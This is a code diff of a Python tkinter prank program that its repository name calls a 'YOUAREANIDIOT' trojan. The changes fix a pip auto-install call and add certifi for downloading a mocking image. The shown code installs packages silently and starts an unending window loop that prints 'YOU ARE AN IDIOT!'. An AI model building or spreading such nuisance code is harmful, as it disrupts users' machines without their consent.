@@ -2,15 +2,18 @@
 
 import tkinter as tk
 import random
+
 try:
     from PIL import ImageTk, Image
+    import certifi
 except:
     try:
         import pip._internal as pipinstall
     except:
         import pip as pipinstall
-    pipinstall.main(['install', '--user', 'pillow')
+    pipinstall.main(['install', '--user', 'pillow', 'certifi'])
     from PIL import ImageTk, Image
+    import certifi
     
 from io import BytesIO
 import urllib.request as request
@@ -18,7 +21,7 @@ import urllib.request as request
 root = tk.Tk()
 
 URL="https://raw.githubusercontent.com/MandiYang/YOUAREANIDIOT.PY.TROJAN/master/dist/IDIOT.png"
-response = request.urlopen(URL)
+response = request.urlopen(URL, cafile=certifi.where())
 img_data = response.read()
 h=BytesIO(img_data)
 open_i=Image.open(h)
@@ -48,7 +51,7 @@ def startInfiniteLoop():
         tkl.update()
         if i%500 == 0:
             root.update()
-            
+        
 def IDIOT():
     print("YOU ARE AN IDIOT!")
 
@@ -59,6 +62,7 @@ startInfiniteLoop()
 root.mainloop()
 
 # SCRIPT SAYS BYE!
+
 
 
 
